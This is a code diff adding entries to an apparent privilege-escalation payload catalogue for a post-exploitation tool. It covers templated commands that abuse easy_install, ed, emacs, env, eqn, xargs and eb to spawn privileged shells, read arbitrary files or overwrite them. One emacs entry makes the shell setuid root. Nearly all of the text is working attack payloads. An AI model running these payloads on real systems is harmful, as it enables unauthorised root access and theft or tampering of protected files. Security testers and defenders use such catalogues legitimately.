@@ -543,6 +543,136 @@
 			"input": "!{shell} -p\n",
 			"exit": "exit\nq\n"
 		}
-	]
+	],
+//-------------------------------------------------------------------
+	"easy_install": [
+		{
+			"type": "shell",
+			"payload": "TF=none; {command} -h; TF=$({mktemp} -d);echo \"import os; os.execl('/bin/sh', 'sh', '-c', '{shell} <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py; {command} $TF",
+			"args": [],
+			"exit": "exit\n"
+		},
+		{	
+			"type": "read",
+			"stream": "raw",
+			"payload": "TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp} -d);echo \"import sys; sys.stdout.buffer.write(open('{lfile}', 'rb').read())\" > $TF/setup.py; {command} $TF 2>/dev/null | {tail} -n +4",
+			"args": []
+		}
+		// This seems to write small files... but not large (over ~4 KB). So we won't use it... ???
+		// ,{
+		// 	"type": "write",
+		// 	"stream": "base64",
+		// 	"payload": "TF=none; {command} -h 2>/dev/null 1>&2; TF=$({mktemp} -d); {cat} > $TF/b64; echo \"import os; os.execl('''{python}''', 'python', '''-c''', '''import base64; open('{lfile}','wb').write(base64.b64decode(open('$TF/b64', 'rb').read()))''')\" > $TF/setup.py; {command} $TF 2>/dev/null",
+		// 	"args": [],
+		// 	"exit": "{ctrl_d}{ctrl_d}"
+		// }
+	],
+//-------------------------------------------------------------------
+	"eb": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["logs"],
+			"input": "!{shell} -p\n",
+			"exit": "exit\nq\n"
+		}
+	],
+//-------------------------------------------------------------------
+	"ed": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"input": "!{shell} -p\n",
+			"exit": "exit\nq\n"
+		},
+		{	
+			"type": "read",
+			"stream": "raw",
+			"payload": "echo ',p' | {command}",
+			"args": ["-s", "{lfile}"],
+			"input" : ",p\n",
+			"exit" : "q\n"
+		},
+		{
+			"type": "write",
+			"stream": "print",
+			"payload": "echo -e \"1,\\$d\\na\\n$({cat})\\n.\\nw\\nq\\n\" | {command}",
+			"args": ["-s", "{lfile}"],
+			"exit": "{ctrl_d}"
+		}
+	],
+//-------------------------------------------------------------------
+	"emacs": [
+		{
+			"type": "shell",
+			"payload": "{command}; {shell} -p",
+			"args": ["-Q", "-nw", "--eval '(chmod \"{shell}\" #o4755)'" , "--eval \"(kill-emacs)\""],
+			"exit": "exit\n"
+		},
+		{	
+			"type": "read",
+			"stream": "raw",
+			"payload": "TF=$({mktemp}); {command}; {cat} $TF ",
+			"args": ["-Q", "-nw", "{lfile}", "--eval \"(write-file \\\"$TF\\\")\"", "--eval '(kill-emacs)'"]
+		},
+		{	
+			"type": "write",
+			"stream": "print",
+			"payload": "{cat} > /tmp/.em; {command}",
+			"args": ["-Q", "-nw", "/tmp/.em", "--eval \"(write-file \\\"{lfile}\\\")\"", "--eval '(kill-emacs)'"],
+			"exit": "{ctrl_d}{ctrl_d}"
+		}
+	],
+//-------------------------------------------------------------------
+	"env": [
+		{
+			"type": "shell",
+			"payload": "{command} {shell} -p",
+			"args": [],
+			"exit": "exit\n"
+		}
+	],
+//-------------------------------------------------------------------
+	"eqn": [
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "TF={lfile}; {command} | {grep} -Pzo \"(?s)\\.lf 1 $TF.*\" | {tail} -n +2",
+			"args": ["$TF"]
+		}
+	],
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+//-------------------------------------------------------------------
+	"xargs": [
+		{
+			"type": "shell",
+			"payload": "{command}",
+			"args": ["-a", "/dev/null", "{shell}", "-p"],
+			"exit": "exit\n"
+		},
+		{
+			"type": "read",
+			"stream": "print",
+			"payload": "{command}",
+			"args": ["-a", "{lfile}", "-0"]
+		}
+	]
 }
